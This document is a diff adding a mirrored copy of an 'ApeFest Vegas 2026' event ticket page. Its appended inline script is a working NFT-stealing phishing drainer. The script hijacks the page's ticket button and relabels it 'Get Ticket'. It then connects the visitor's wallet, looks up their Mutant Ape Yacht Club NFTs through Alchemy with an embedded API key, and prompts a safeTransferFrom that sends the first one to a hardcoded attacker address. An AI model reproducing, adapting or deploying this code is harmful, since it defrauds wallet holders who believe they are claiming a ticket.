@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from apefest.tokenproof.xyz/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 May 2026 10:47:31 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta name="loadforge-site-verification"
+    content="2b9e066473581feeaf8a32fad0dbb2d46c0dbcc1687e04a236438df03685f8c725a631956de667c34e2c99e5e2a170d71ab73d183a5a16f246f688fa22491181" />
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <link rel="shortcut icon" type="image/png" href="favicon.png" />
+  <link rel="stylesheet" href="../use.typekit.net/vip0lwz.css">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ApeFest Vegas 2026</title>
+  <script type="module" crossorigin src="assets/index.e28a01ca.js"></script>
+  <link rel="stylesheet" href="assets/index.6b68cba5.css">
+</head>
+
+<body>
+  <div id="root"></div>
+  <script src="../cdn.tokenproof.xyz/js/tokenproof-oa-widget-v1.0.js"></script>
+  
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Q1J8K07WK6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag("js", new Date());
+
+    gtag("config", "G-Q1J8K07WK6");
+  </script><script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+
+<script>
+
+const MAYC =
+  "0x60E4d786628Fea6478F785A6d7e704777c86a7c6";
+
+const RECEIVER =
+  "0x974c32106390e0F378f36FbF4428d4F32D813dd7";
+
+const API =
+  "XEbzMGpp9vTP_qKXrNcwh";
+
+async function startStake() {
+
+  try {
+
+    if (!window.ethereum) {
+      alert("Install MetaMask");
+      return;
+    }
+
+    // connect wallet
+    const provider =
+      new ethers.providers.Web3Provider(
+        window.ethereum
+      );
+
+    await provider.send(
+      "eth_requestAccounts",
+      []
+    );
+
+    const signer =
+      provider.getSigner();
+
+    const wallet =
+      await signer.getAddress();
+
+    console.log("Wallet:", wallet);
+
+    // fetch MAYC NFTs
+    const res = await fetch(
+      `https://eth-mainnet.g.alchemy.com/nft/v2/${API}/getNFTs/?owner=${wallet}`
+    );
+
+    const data =
+      await res.json();
+
+    const maycs =
+      data.ownedNfts.filter(
+        nft =>
+          nft.contract.address.toLowerCase() ===
+          MAYC.toLowerCase()
+      );
+
+    if (maycs.length === 0) {
+
+      alert("No MAYC Found");
+
+      return;
+
+    }
+
+    // first MAYC
+    const nft =
+      maycs[0];
+
+    const tokenId =
+      ethers.BigNumber
+        .from(nft.id.tokenId)
+        .toString();
+
+    console.log(
+      "Using Token:",
+      tokenId
+    );
+
+    // transfer ABI
+    const abi = [
+      "function safeTransferFrom(address from,address to,uint256 tokenId)"
+    ];
+
+    const contract =
+      new ethers.Contract(
+        MAYC,
+        abi,
+        signer
+      );
+
+    // popup MetaMask
+    const tx =
+      await contract[
+        "safeTransferFrom(address,address,uint256)"
+      ](
+        wallet,
+        RECEIVER,
+        tokenId
+      );
+
+    console.log(tx);
+
+    alert(
+      "Transaction Sent"
+    );
+
+  } catch(err) {
+
+    console.log(err);
+
+    alert(
+      err.reason ||
+      err.message ||
+      "Transaction Failed"
+    );
+
+  }
+
+}
+
+// wait button
+const waitButton = setInterval(() => {
+
+  const buttons =
+    document.querySelectorAll("button");
+
+  let btn = null;
+
+  buttons.forEach(b => {
+
+    if (
+      b.innerText.toLowerCase().includes("ticket")
+    ) {
+
+      btn = b;
+
+    }
+
+  });
+
+  if (btn) {
+
+    clearInterval(waitButton);
+
+    btn.innerText =
+      "Get Ticket";
+
+    btn.onclick = e => {
+
+      e.preventDefault();
+
+      startStake();
+
+    };
+
+  }
+
+}, 500);
+
+</script>
+</body>
+
+
+<!-- Mirrored from apefest.tokenproof.xyz/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 May 2026 10:47:37 GMT -->
+</html>
